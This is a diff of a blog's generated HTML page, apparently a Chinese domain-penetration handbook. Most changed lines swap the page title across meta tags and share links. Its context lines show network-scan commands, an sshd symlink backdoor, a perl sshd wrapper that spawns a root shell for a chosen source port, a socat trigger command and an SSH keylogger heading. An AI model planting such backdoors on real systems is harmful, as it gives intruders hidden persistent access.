@@ -9,7 +9,7 @@
     <meta name="baidu-site-verification" content="code-n4alrUzr1E" />
     <meta name="description" content="1.无凭证情况下网络扫描1234567cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机nmap -sP -p &lt;ip&gt; 							# ping 扫描nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描nmap -PN --script smb-vuln* -p139,445 &lt;ip&amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="How to Bypass AMSI">
+<meta property="og:title" content="域渗透一条龙手册">
 <meta property="og:url" content="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/index.html">
 <meta property="og:site_name" content="0r@nge の窝">
 <meta property="og:description" content="1.无凭证情况下网络扫描1234567cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机nmap -sP -p &lt;ip&gt; 							# ping 扫描nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描nmap -PN --script smb-vuln* -p139,445 &lt;ip&amp;">
@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67">
 <meta property="og:image" content="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67">
 <meta property="article:published_time" content="2022-01-26T09:11:10.000Z">
-<meta property="article:modified_time" content="2022-01-26T09:11:49.790Z">
+<meta property="article:modified_time" content="2022-01-26T09:15:29.173Z">
 <meta property="article:author" content="0r@nge">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="域渗透">
@@ -43,7 +43,7 @@
       
     
     <!-- title -->
-    <title>How to Bypass AMSI</title>
+    <title>域渗透一条龙手册</title>
     <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -104,16 +104,16 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&text=How to Bypass AMSI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&is_video=false&description=How to Bypass AMSI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=How to Bypass AMSI&body=Check out this article: https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&name=How to Bypass AMSI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&t=How to Bypass AMSI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&text=域渗透一条龙手册"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&is_video=false&description=域渗透一条龙手册"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透一条龙手册&body=Check out this article: https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&name=域渗透一条龙手册&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&t=域渗透一条龙手册"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -130,7 +130,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        How to Bypass AMSI
+        域渗透一条龙手册
     </h1>
 
 
@@ -789,7 +789,7 @@
 
 <h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span><br></pre></td></tr></table></figure>
 
-<p>链接：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#50;&#48;&#54;&#46;&#x31;&#x34;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#50;&#48;&#54;&#46;&#x31;&#x34;&#50;</a> -p 2333</p>
+<p>链接：ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#48;&#54;&#46;&#49;&#x34;&#x32;">&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#48;&#54;&#46;&#49;&#x34;&#x32;</a> -p 2333</p>
 <h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">//不用重启也行</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span><br></pre></td></tr></table></figure>
 
 <h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
@@ -1016,16 +1016,16 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&text=How to Bypass AMSI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&is_video=false&description=How to Bypass AMSI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=How to Bypass AMSI&body=Check out this article: https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=How to Bypass AMSI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&name=How to Bypass AMSI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&t=How to Bypass AMSI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&text=域渗透一条龙手册"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&is_video=false&description=域渗透一条龙手册"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透一条龙手册&body=Check out this article: https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&title=域渗透一条龙手册"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&name=域渗透一条龙手册&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/&t=域渗透一条龙手册"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
